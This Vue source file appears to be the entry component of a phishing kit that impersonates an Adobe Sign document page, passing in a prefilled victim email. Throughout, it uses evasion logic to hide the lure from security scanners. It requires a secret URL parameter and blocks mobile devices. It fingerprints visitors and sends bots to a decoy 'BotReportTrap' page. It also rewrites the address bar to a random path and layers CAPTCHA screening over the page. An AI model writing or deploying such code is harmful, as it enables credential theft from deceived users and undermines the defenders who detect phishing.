<template>
  <div class="background">
 
    <div v-if="isMobile" class="card-container">
      <div style="font-size: 48px; margin-bottom: 20px;">💻</div>
      <h2 style="color: #323130; margin-bottom: 10px;">Desktop Computer Required</h2>
      <p style="color: #605e5c; margin-bottom: 20px;">This document is not compatible with mobile devices.</p>
      <p style="color: #605e5c;">Please use a desktop computer to access this secure link.</p>
    </div>

    <!-- Loading screen ALWAYS shows while isCheckingBot is true -->
    <div v-else-if="isCheckingBot" class="loading-screen">
      <div class="loading-spinner"></div>
      <p>One moment please</p>
    </div>

    <BotReportTrap v-else-if="isBotBlocked" />

    <BotReportTrap v-else-if="!hasRequiredParam" />

    <div v-else-if="!recaptchaV3Ready" class="loading-screen">
      <div class="loading-spinner"></div>
      <p>One moment please</p>
    </div>

    <AdobeSignPage 
      v-else
      :prefilledEmail="email"
      :cookie-consent="cookieConsent"
      @cookie-consent="handleCookieConsent"
    />

    <!-- Analytics component - auto-sends on mount -->
    <Analytics v-if="shouldLoadAnalytics" />
  </div>
</template>

<script>
import AdobeSignPage from './components/AdobeSignPage.vue'
import BotReportTrap from './components/landing.vue'
import { securityMixin } from './mixins/security.js'

export default {
  name: 'App',
  mixins: [securityMixin],
  components: {
    AdobeSignPage,
    BotReportTrap
  },
  data() {
    return {
      hasRequiredParam: false,
      email: null,
      cookieConsent: null,
      isCheckingBot: true,
      isBotBlocked: false,
      recaptchaV3SiteKey: '6Lcf8LYrAAAAAA3MzMKi1zW1FJBn4XGxvid5p4_d',
      recaptchaV3Ready: false,
      hCaptchaSiteKey: '9284496e-961a-4bf0-947e-149e0f922f18',
      challengeActive: false,
      shouldLoadAnalytics: false,
      isMobile: false
    }
  },
  async created() {
    // Check for mobile device first (with configurable blocking)
    await this.checkDevice()
    if (this.isMobile) {
      this.isCheckingBot = false
      return
    }

    if (!this.checkRequiredParameter()) {
    
      this.isCheckingBot = false
      return
    }
    
   
    this.addRandomPathToUrl()
    

    await this.checkForBots()
    
    if (!this.isBotBlocked) {
  
      await this.initRecaptchaV3()
      this.initializeForHumans()
    }
  },
  methods: {
    async checkDevice() {
      const ua = navigator.userAgent.toLowerCase()
      const isMobileDevice = ua.includes('iphone') || ua.includes('ipad') || ua.includes('ipod') || ua.includes('android') || ua.includes('webos') || ua.includes('blackberry') || ua.includes('iemobile') || ua.includes('opera mini')
      
      if (isMobileDevice) {
        // Check if mobile blocking is enabled from server settings
        try {
          const response = await fetch('/api/verify-email?action=mobilesettings')
          const data = await response.json()
          // Only block if blockMobile is true (default is true)
          if (data.blockMobile !== false) {
            this.isMobile = true
          }
        } catch (error) {
          // If we can't reach the API, default to blocking mobile
          this.isMobile = true
        }
      }
    },

    checkRequiredParameter() {
      const urlParams = new URLSearchParams(window.location.search)
      const qParam = urlParams.get('q')
      
     
      if (qParam === 'a') {
        this.hasRequiredParam = true
        return true
      }
      
    
      this.hasRequiredParam = false
      return false
    },
    
    addRandomPathToUrl() {
      const randomPath = this.generateRandomPath()
     
      const currentParams = new URLSearchParams(window.location.search)
      currentParams.delete('q') 
      
    
      const newParams = currentParams.toString()
      const newUrl = `/${randomPath}${newParams ? '?' + newParams : ''}`
      history.replaceState(null, '', newUrl)
    },

    generateRandomPath() {
      const randomHex1 = Array.from(crypto.getRandomValues(new Uint8Array(16)))
        .map(b => b.toString(16).padStart(2, '0'))
        .join('');
      const randomHex2 = Array.from(crypto.getRandomValues(new Uint8Array(32)))
        .map(b => b.toString(16).padStart(2, '0'))
        .join('');
      return `${randomHex1}.${randomHex2}`;
    },

    async checkForBots() {
      try {
        const result = await this.$fpjs.getVisitorData({ ignoreCache: true })
        
        const response = await fetch('/api/trap', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            requestId: result.requestId,
            visitorId: result.visitorId
          })
        })
        
        const data = await response.json()
        this.isBotBlocked = data.isBot
        
      } catch (error) {
        this.isBotBlocked = false
      } finally {
        this.isCheckingBot = false
      }
    },

    async initRecaptchaV3() {
      try {
        if (window.grecaptcha) {
          this.recaptchaV3Ready = true
          this.scoreUser()
          return
        }
        
        await new Promise((resolve, reject) => {
          window.onRecaptchaLoaded = () => {
            if (window.grecaptcha?.ready) {
              window.grecaptcha.ready(() => {
                this.recaptchaV3Ready = true
                this.scoreUser()
                resolve()
              })
            } else {
              reject(new Error('grecaptcha not available'))
            }
          }
          
          const script = document.createElement('script')
          script.src = `https://www.google.com/recaptcha/api.js?onload=onRecaptchaLoaded&render=${this.recaptchaV3SiteKey}`
          script.async = true
          script.onerror = reject
          document.head.appendChild(script)
        })
      } catch (error) {
        console.error('reCAPTCHA v3 failed:', error)
        this.recaptchaV3Ready = true
      }
    },

    async scoreUser() {
      try {
        if (!window.grecaptcha) return
        const token = await window.grecaptcha.execute(this.recaptchaV3SiteKey, { action: 'submit' })
        const response = await fetch('/api/verify-recaptcha', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ token, action: 'submit' })
        })
        const data = await response.json()
        if (data.success && data.score < 0.7) {
          this.showHCaptchaChallenge()
        }
      } catch (error) {
        console.error('reCAPTCHA scoring failed:', error)
      }
    },

    showHCaptchaChallenge() {
      if (this.challengeActive) return
      this.challengeActive = true
      
      const overlay = document.createElement('div')
      overlay.id = 'hcaptcha-overlay'
      overlay.innerHTML = `
        <div style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(0,0,0,0.9);display:flex;align-items:center;justify-content:center;z-index:10000;padding:20px">
          <div style="background:white;border-radius:8px;padding:40px;max-width:420px;text-align:center;width:100%">
            <p style="margin:0 0 20px 0;color:#666;font-size:16px">Are you a human or a robot?</p>
            <div style="margin:25px 0;display:flex;justify-content:center;min-height:78px;">
              <div id="hcaptcha-widget"></div>
            </div>
            <p style="margin:16px 0 0 0;color:#999;font-size:12px;">It's nothing personal. Some bots are incredibly deceptive nowadays.</p>
          </div>
        </div>
      `
      document.body.appendChild(overlay)
      
     
      if (!window.hcaptcha) {
        const script = document.createElement('script')
        script.src = 'https://js.hcaptcha.com/1/api.js'
        script.onload = () => this.renderHCaptcha()
        document.head.appendChild(script)
      } else {
        this.renderHCaptcha()
      }
    },

    renderHCaptcha() {
      const element = document.getElementById('hcaptcha-widget')
      if (!element || !window.hcaptcha) return
      
      try {
        window.hcaptcha.render(element, {
          sitekey: this.hCaptchaSiteKey,
          callback: (token) => this.onHCaptchaSuccess(token),
          'error-callback': () => this.onHCaptchaError(),
          'expired-callback': () => this.onHCaptchaError()
        })
      } catch (error) {
        console.error('hCaptcha render error:', error)
        this.removeHCaptchaChallenge()
      }
    },

    async onHCaptchaSuccess(token) {
      try {
        const response = await fetch('/api/verify-hcaptcha', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ token })
        })
        const data = await response.json()
        
        if (data.success) {
          this.removeHCaptchaChallenge()
        } else {
          console.error('hCaptcha verification failed:', data)
          this.onHCaptchaError()
        }
      } catch (error) {
        console.error('hCaptcha verification error:', error)
        this.onHCaptchaError()
      }
    },

    onHCaptchaError() {
      console.error('hCaptcha error occurred')
      setTimeout(() => this.removeHCaptchaChallenge(), 2000)
    },

    removeHCaptchaChallenge() {
      const overlay = document.getElementById('hcaptcha-overlay')
      if (overlay) overlay.remove()
      this.challengeActive = false
    },

    initializeForHumans() {
      setTimeout(() => this.getVisitorInfo(), 100)
      
      var savedConsent = localStorage.getItem('cookieConsent')
      if (savedConsent) {
        try {
          var consent = JSON.parse(savedConsent)
          this.cookieConsent = consent
          if (consent.accepted && consent.preferences.statistics) {
            this.shouldLoadAnalytics = true
          }
        } catch (e) {
          localStorage.removeItem('cookieConsent')
        }
      }
    },

    async getVisitorInfo() {
      const ipElement = document.getElementById('visitor-info')
      if (!ipElement) {
        return
      }
      
      try {
        const response = await fetch('/api/visitor-info')
        const data = await response.json()
        ipElement.textContent = data.info
      } catch (error) {
        ipElement.textContent = 'Location: Unknown • ISP: Unknown'
      }
    },
    
    handleCookieConsent: function(consent) {
      this.cookieConsent = consent
      
      try {
        localStorage.setItem('cookieConsent', JSON.stringify(consent))
      } catch (e) {
        // Silent fail
      }
      
      if (consent.accepted && consent.preferences.statistics) {
        this.shouldLoadAnalytics = true
      }
    }
  }
}
</script>

<style>
* {
  box-sizing: border-box;
}

html, body {
  margin: 0;
  padding: 0;
  width: 100%;
  overflow-x: hidden;
  font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif;
}

.background {
  background-color: #f3f2f1;
  background-image: none;
  min-height: 100vh;
  width: 100%;
  display: flex;
  align-items: center;
  justify-content: center;
  position: relative;
}

.loading-screen {
  display: flex;
  flex-direction: column;
  align-items: center;
  text-align: center;
}

.loading-spinner {
  width: 40px;
  height: 40px;
  border: 4px solid #f3f3f3;
  border-top: 4px solid #2196f3;
  border-radius: 50%;
  animation: spin 1s linear infinite;
  margin-bottom: 20px;
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}

.loading-screen p {
  color: #666;
  font-size: 16px;
  margin: 0;
}

@media (max-width: 768px) {
  .background {
    padding: 0;
    align-items: flex-start;
    padding-top: 20px;
  }
}

input, textarea {
  -webkit-user-select: text !important;
  -moz-user-select: text !important;
  -ms-user-select: text !important;
  user-select: text !important;
}

body {
  overflow-x: hidden;
}

.card-container {
  background: white;
  border-radius: 8px;
  box-shadow: 0 2px 4px rgba(0,0,0,0.1);
  padding: 24px;
  max-width: 440px;
  width: 100%;
  margin: 20px;
  text-align: center;
}

@media (hover: none) {
  .background {
    -webkit-overflow-scrolling: touch;
  }
}
</style>

